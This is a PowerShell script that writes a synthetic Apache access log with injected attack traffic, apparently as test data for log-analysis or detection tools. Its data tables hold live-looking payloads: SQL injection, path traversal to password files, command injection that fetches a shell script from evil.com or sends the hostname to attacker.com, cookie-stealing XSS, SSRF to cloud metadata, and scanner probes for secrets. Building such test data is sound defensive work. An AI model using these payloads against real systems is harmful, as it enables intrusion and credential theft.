#Requires -Version 5.1
<#
.SYNOPSIS
    Generates a realistic Apache combined-format test log with injected anomalies.
.PARAMETER Output
    Output file path. Default: test-apache.log
.PARAMETER Lines
    Number of log lines. Default: 10000
.EXAMPLE
    .\generate_logs.ps1
    .\generate_logs.ps1 -Output big.log -Lines 50000
#>
param(
    [string]$Output = "test-apache.log",
    [int]$Lines     = 10000
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

# ── Data tables ───────────────────────────────────────────────────────────────

$Months       = @("Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec")

$NormalIps    = @(
    "203.0.113.1",  "203.0.113.5",    "203.0.113.22",  "198.51.100.4",
    "198.51.100.17","192.0.2.88",     "10.0.0.15",     "172.16.0.33",
    "185.220.101.45","91.108.4.200",  "35.180.22.101", "54.239.17.6",
    "66.249.66.1",  "157.240.22.35",  "104.26.10.233", "151.101.1.57"
)

$AttackerIps  = @("45.33.32.156", "195.54.164.12", "178.62.108.44")
$ScannerIp    = "80.82.77.33"
$BruteIp      = "103.21.244.14"

$NormalPaths  = @(
    "/", "/index.html", "/about", "/contact", "/products", "/services",
    "/api/v1/users", "/api/v1/products", "/api/v1/orders",
    "/static/css/main.css", "/static/js/app.js", "/favicon.ico",
    "/images/logo.png", "/dashboard", "/login", "/logout",
    "/api/v1/health", "/robots.txt", "/sitemap.xml", "/privacy",
    "/terms", "/blog", "/docs", "/api/v1/search?q=widget"
)

$Methods      = @("GET","GET","GET","GET","GET","POST","PUT","DELETE")

# Flat status pool — pick at random to get weighted distribution
$StatusPool   = (
    (@(200) * 60) + (@(301) * 4) + (@(302) * 3) + (@(304) * 10) +
    (@(400) * 2)  + (@(401) * 3) + (@(403) * 2) + (@(404) * 9)  +
    (@(500) * 2)  + (@(503) * 1)
)

$UserAgents   = @(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15",
    "Mozilla/5.0 (Android 14; Mobile; rv:115.0) Gecko/115.0 Firefox/115.0",
    "Googlebot/2.1 (+http://www.google.com/bot.html)",
    "python-requests/2.31.0",
    "curl/8.4.0"
)

$ScannerUa    = "Nikto/2.1.6 (Evasion: None)"

$SqlPaths     = @(
    "/login?user=admin'--&pass=x",
    "/search?q=1'+OR+'1'='1",
    "/products?id=1;DROP+TABLE+users--",
    "/api/v1/users?filter=1+UNION+SELECT+username,password+FROM+users--",
    "/profile?id=1'+AND+SLEEP(5)--",
    "/items?sort=name+ASC;SELECT+SLEEP(5)--"
)

$TraversalPaths = @(
    "/../../../etc/passwd",
    "/files/../../windows/system32/cmd.exe",
    "/download?file=../../../etc/shadow",
    "/static/../../../windows/win.ini",
    "/api/v1/read?path=../../../../etc/hosts"
)

$ShellPaths   = @(
    "/ping?host=localhost|whoami",
    "/cmd?exec=ls;cat+/etc/passwd",
    "/tools/lookup?domain=google.com&&curl+http://attacker.com/`$(hostname)",
    "/api/run?cmd=wget+http://evil.com/shell.sh;chmod+777+shell.sh;./shell.sh"
)

$XssPaths     = @(
    "/search?q=<script>alert(document.cookie)</script>",
    "/comment?text=<img+src=x+onerror=alert(1)>",
    '/profile?name="><script>fetch(`"http://attacker.com/?c=`"+document.cookie)</script>'
)

$SsrfPaths    = @(
    "/api/fetch?url=file:///etc/passwd",
    "/api/proxy?target=http://169.254.169.254/latest/meta-data/",
    "/webhook?callback=http://internal:8080/admin",
    "/api/v1/import?source=http://127.0.0.1:9200/_cat/indices"
)

$ScannerPaths = @(
    "/.env", "/.git/config", "/wp-admin/", "/wp-config.php",
    "/phpmyadmin/", "/admin/", "/config.php", "/.htaccess",
    "/backup.zip", "/db.sql", "/server-status", "/.DS_Store",
    "/xmlrpc.php", "/cgi-bin/test.cgi", "/adminer.php",
    "/config/database.yml", "/.ssh/id_rsa", "/etc/passwd"
)

$Referers     = @("-","-","-","https://www.google.com/","https://example.com/","https://bing.com/")

# ── Helpers ───────────────────────────────────────────────────────────────────

function Get-RandItem([array]$arr) { $arr[(Get-Random -Maximum $arr.Count)] }

function Get-RandBytes([int]$status) {
    if ($status -in 301,302,304) { return Get-Random -Minimum 0 -Maximum 256 }
    if ($status -ge 400)         { return Get-Random -Minimum 128 -Maximum 1024 }
    return Get-Random -Minimum 512 -Maximum 65536
}

function Format-ApacheTime([datetime]$dt) {
    "{0:D2}/{1}/{2}:{3:D2}:{4:D2}:{5:D2} +0000" -f `
        $dt.Day, $Months[$dt.Month-1], $dt.Year,
        $dt.Hour, $dt.Minute, $dt.Second
}

function New-LogLine {
    param(
        [string]$Ip,
        [string]$Method,
        [string]$Path,
        [int]$Status,
        [datetime]$Dt,
        [string]$Ua      = "",
        [string]$Referer = ""
    )
    if (-not $Ua)      { $Ua      = Get-RandItem $UserAgents }
    if (-not $Referer) { $Referer = Get-RandItem $Referers }
    $bytes = Get-RandBytes $Status
    $ts    = Format-ApacheTime $Dt
    return "$Ip - - [$ts] `"$Method $Path HTTP/1.1`" $Status $bytes `"$Referer`" `"$Ua`""
}

# ── Main ──────────────────────────────────────────────────────────────────────

Write-Host "Generating $Lines lines → $Output ..."

$rng = [System.Random]::new(42)
$dt  = [datetime]::new(2026, 5, 1, 0, 0, 0)
$buf = [System.Collections.Generic.List[string]]::new($Lines)
$i   = 0

while ($i -lt $Lines) {
    $r = $rng.NextDouble()

    # Brute-force burst: 55 POST /login → 401 from one IP within ~9 s
    if ($i -gt 800 -and $r -lt 0.004 -and ($i + 60) -lt $Lines) {
        for ($j = 0; $j -lt 55; $j++) {
            $dt = $dt.AddSeconds($rng.NextDouble() * 0.10 + 0.08)
            $buf.Add((New-LogLine -Ip $BruteIp -Method "POST" -Path "/login" `
                -Status 401 -Dt $dt -Ua "python-requests/2.31.0"))
            $i++
        }
        continue
    }

    # Scanner burst: 15 probes for sensitive paths
    if ($i -gt 400 -and $r -lt 0.006 -and ($i + 20) -lt $Lines) {
        $probes = $ScannerPaths | Get-Random -Count ([Math]::Min(15, $ScannerPaths.Count))
        foreach ($path in $probes) {
            $dt = $dt.AddSeconds($rng.NextDouble() * 0.21 + 0.04)
            $buf.Add((New-LogLine -Ip $ScannerIp -Method "GET" -Path $path `
                -Status 404 -Dt $dt -Ua $ScannerUa))
            $i++
        }
        continue
    }

    # SQL injection
    if ($r -lt 0.018) {
        $dt = $dt.AddSeconds($rng.NextDouble() * 3.5 + 0.5)
        $buf.Add((New-LogLine -Ip (Get-RandItem $AttackerIps) -Method "GET" `
            -Path (Get-RandItem $SqlPaths) -Status 200 -Dt $dt))
        $i++; continue
    }

    # Path traversal
    if ($r -lt 0.030) {
        $dt = $dt.AddSeconds($rng.NextDouble() * 3.5 + 0.5)
        $buf.Add((New-LogLine -Ip (Get-RandItem $AttackerIps) -Method "GET" `
            -Path (Get-RandItem $TraversalPaths) -Status 403 -Dt $dt))
        $i++; continue
    }

    # Shell injection
    if ($r -lt 0.038) {
        $dt = $dt.AddSeconds($rng.NextDouble() * 4 + 1)
        $buf.Add((New-LogLine -Ip (Get-RandItem $AttackerIps) -Method "GET" `
            -Path (Get-RandItem $ShellPaths) -Status 200 -Dt $dt))
        $i++; continue
    }

    # XSS
    if ($r -lt 0.044) {
        $dt = $dt.AddSeconds($rng.NextDouble() * 2.5 + 0.5)
        $buf.Add((New-LogLine -Ip (Get-RandItem $AttackerIps) -Method "GET" `
            -Path (Get-RandItem $XssPaths) -Status 200 -Dt $dt))
        $i++; continue
    }

    # SSRF / XXE
    if ($r -lt 0.048) {
        $dt = $dt.AddSeconds($rng.NextDouble() * 4 + 1)
        $buf.Add((New-LogLine -Ip (Get-RandItem $AttackerIps) -Method "GET" `
            -Path (Get-RandItem $SsrfPaths) -Status 200 -Dt $dt))
        $i++; continue
    }

    # Normal traffic
    $dt = $dt.AddSeconds($rng.NextDouble() * 2.45 + 0.05)
    $buf.Add((New-LogLine `
        -Ip     (Get-RandItem $NormalIps) `
        -Method (Get-RandItem $Methods) `
        -Path   (Get-RandItem $NormalPaths) `
        -Status ($StatusPool[(Get-Random -Maximum $StatusPool.Count)]) `
        -Dt     $dt))
    $i++
}

[System.IO.File]::WriteAllLines(
    [System.IO.Path]::GetFullPath($Output),
    $buf,
    [System.Text.Encoding]::UTF8
)

$anomCount = ($buf | Where-Object {
    $_ -match "'--|OR '1'|DROP TABLE|UNION SELECT|/\.\./|whoami|alert\(|169\.254|/\.env|wp-config|db\.sql"
}).Count

Write-Host "Done: $($buf.Count.ToString('N0')) lines -> $Output"
Write-Host ("Approx. {0:N0} anomalous lines ({1:F1}%)" -f $anomCount, ($anomCount / $buf.Count * 100))
